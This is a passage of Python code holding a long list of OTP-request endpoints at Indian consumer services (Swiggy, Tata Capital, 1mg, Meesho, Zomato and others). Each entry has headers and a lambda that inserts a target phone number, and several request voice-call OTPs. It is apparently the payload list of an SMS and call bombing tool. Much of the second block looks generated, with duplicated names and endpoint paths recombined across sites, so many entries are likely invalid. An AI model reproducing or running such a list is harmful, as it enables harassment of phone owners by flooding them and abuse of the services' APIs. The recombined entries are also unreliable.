        "data": lambda p: f'{{"app_version":"7.10.51","aaid":"538bd3a8-09c3-47fa-9141-6203f4c89450","course":"","phone_number":"{p}","language":"en","udid":"b751fb63c0ae17ba","class":"","gcm_reg_id":"eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"}}'
    },
    {
        "name": "nobroker_1",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "origin": "https://www.nobroker.in",
            "referer": "https://www.nobroker.in/"
        },
        "data": lambda p: f"phone={p}&countryCode=IN"
    },
    {
        "name": "shiprocket_3",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "Bearer null",
            "origin": "https://app.shiprocket.in",
            "referer": "https://app.shiprocket.in/"
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "tatacapital_2",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json"
        },
        "data": lambda p: f'{{"phone":"{p}","applSource":"","isOtpViaCallAtLogin":"true"}}'
    },
    {
        "name": "penpencil_2",
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'
    },
    {
        "name": "1mg_2",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda p: f'{{"number":"{p}","is_corporate_user":false,"otp_on_call":true}}'
    },
    {
        "name": "swiggy_call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {
            "user-agent": "Swiggy-Android",
            "accept": "application/json; charset=utf-8",
            "content-type": "application/json; charset=utf-8"
        },
        "data": lambda p: f'{{"mobile":"{p}"}}'
    },
    {
        "name": "kpnfresh_web_2",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "x-channel-id": "WEB",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.kpnfresh.com",
            "referer": "https://www.kpnfresh.com/"
        },
        "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'
    },
    {
        "name": "servetel_2",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)"
        },
        "data": lambda p: f"mobile_number={p}"
    },

    # ─── From second code block (ULTIMATEAPIS) ───
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Oyorooms WhatsApp', 'url': 'https://oyorooms.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Bigbasket WhatsApp', 'url': 'https://bigbasket.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Rapido SMS', 'url': 'https://rapido.bike/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Uber SMS', 'url': 'https://uber.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Doubtnut SMS', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Cred SMS', 'url': 'https://cred.club/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zepto WhatsApp', 'url': 'https://zepto.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Newme WhatsApp', 'url': 'https://newme.asia/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Meesho SMS', 'url': 'https://meesho.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Meesho WhatsApp', 'url': 'https://meesho.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Pharmeasy WhatsApp', 'url': 'https://pharmeasy.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Blinkit SMS', 'url': 'https://blinkit.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Khatabook Call', 'url': 'https://khatabook.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Myntra WhatsApp', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Dmart SMS', 'url': 'https://dmart.ready.in/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Flipkart WhatsApp', 'url': 'https://flipkart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Ajio Call', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Flipkart Call', 'url': 'https://flipkart.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobile":"{phone}"}}'},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Blinkit Call', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"phoneNumber":"{phone}","otpType":"voice"}}'},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"number":"{phone}","otpOnCall":true}}'},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: f'{{"mobileNumber":"{phone}"}}'},
